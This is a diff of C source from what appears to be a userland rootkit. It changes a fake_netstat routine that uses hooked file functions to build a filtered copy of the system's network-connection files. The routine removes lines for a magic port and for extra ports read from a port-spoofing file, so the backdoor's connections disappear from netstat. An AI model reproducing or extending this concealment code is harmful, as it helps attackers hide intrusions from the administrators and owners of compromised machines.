@@ -56,10 +56,11 @@ int is_net_file(const char *pathname){
 /*
  * Function:  fake_netstat
  * --------------------
- * creates a fakenetstat file given the original and purging it from MAGIC_PORT
+ * creates a fake netstat file given the original and purging MAGIC_PORT
+ * and other jolly ports found in PORTSPOOF_FILE ('\n' split) 
  *
  *  pathname: full the path name
- *  newfile: file pointer to new filename string that will be filled
+ *  newfile: pointer to new filename string that will be filled
  *
  *  returns: 1 if works otherwise 0  
  */
@@ -75,13 +76,61 @@ int fake_netstat(char *pathname, char *newfile){
     char *proto = basename(pathname);
     strcat(newfile,proto);
     FILE *fake_fp = hooked_fopen(newfile,"w");
-    char hex_port[7]; 
-    sprintf(hex_port, ":%04X ", MAGIC_PORT);
 
-    char str[256];
-    while (fgets(str, 256, real_fp)){
-        if (strstr(str, hex_port) == NULL){
-            fputs(str, fake_fp);
+    struct stat buffer;
+    char ports[65535][7];
+    int maxp = 1;
+    sprintf(ports[0], ":%04X ", MAGIC_PORT);
+
+    if (stat(PORTSPOOF_FILE, &buffer) == 0){
+        FILE *pf = hooked_fopen(PORTSPOOF_FILE, "r");
+        char line[32];
+        do {
+            read_line(fileno(pf), line, 32);
+            int port = atoi(line);
+            if (port){
+                char hex_port[7];
+                sprintf(hex_port, ":%04X ", port);
+                int found = 0;
+                for (int x = 0; x < maxp; x++){
+                    if (strcmp(hex_port, ports[x]) == 0){
+                        found = 1;
+                        break;
+                    }
+                }
+                if (found){
+                    break;
+                }
+                #ifdef DEBUG
+                printf("[-] hiding port %d -> %04X\n", port, port);
+                #endif
+                fflush(stdout);
+                sprintf(ports[maxp], "%s", hex_port);
+                maxp ++;
+            }
+        } while(strcmp(line, "") != 0);
+    }
+
+    char str[1024];
+    while (1){
+        int rc = read_line(fileno(real_fp), str, 1024);
+        if (strcmp(str, "") == 0){
+            break;
+        }
+        int towrite = 1;
+        for (int x = 0; x < maxp; x++){
+            if (strstr(str, ports[x]) != NULL){
+                towrite = 0;
+                break;
+            }
+        }
+        if (towrite){
+            if (rc){
+                fprintf(fake_fp, "%s\n", str);
+            }
+            else{
+                fprintf(fake_fp, "%s", str);
+            }
         }
     }
     fchmod(fileno(fake_fp), 0666);
@@ -234,15 +283,25 @@ void uninstall(){
  *
  *  returns: nothing
  */
-void read_line(int fd, char *buffer, int max_size){
+int read_line(int fd, char *buffer, int max_size){
     int l = 0;
-    int c = 'X';
+    char c = 'X';
     while (c && c != '\n' && l < max_size){
-        read(fd, &c, 1);
-        buffer[l] = c;
+        int rc = read(fd, &c, 1);
+        if (rc <= 0){
+            buffer[l] = '\0';
+            return rc;
+        }
+        if (c != '\n'){
+            buffer[l] = c;
+        }
+        else{
+            buffer[l] = '\0';
+        }
         l++;
     }
-    buffer[l-1] = '\0';
+    buffer[l] = '\0';
+    return 1;
 }
 
 /*
